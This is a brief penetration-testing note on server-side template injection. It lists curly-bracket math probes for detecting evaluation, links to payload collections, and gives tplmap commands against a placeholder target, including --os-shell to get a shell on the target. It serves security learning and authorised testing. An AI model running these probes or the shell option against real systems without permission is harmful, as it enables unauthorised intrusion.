Server-Side Template Injection (`SSTI`) is essentially injecting malicious template directives inside a template, leveraging Template Engines that insecurely mix user input with a given template.

We can detect SSTI vulnerabilities by injecting different tags in the inputs we control to see if they are evaluated in the response. We don't necessarily need to see the injected data reflected in the response we receive. Sometimes it is just evaluated on different pages (blind).

The easiest way to detect injections is to supply mathematical expressions in curly brackets, for example:

```html
{7*7}
${7*7}
#{7*7}
%{7*7}
{{7*7}}
```

### Template Fuzzing Flow Diagram
Try each payload and follow the green arrow if successful to determine the template engine
More payloads:
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

![[Pasted image 20230706140630.png]]

### #Tplmap

You can also use automated tools like [TPLMap](https://github.com/epinna/tplmap)

```shell
cd tplmap/
source venv/bin/activate
```

```shell
./tplmap.py -u 'http://www.target.com/page?name=John'
```

Use `--os-shell` option to launch a pseudo-terminal on the target.
```shell
./tplmap.py --os-shell -u 'http://www.target.com/page?name=John'
```
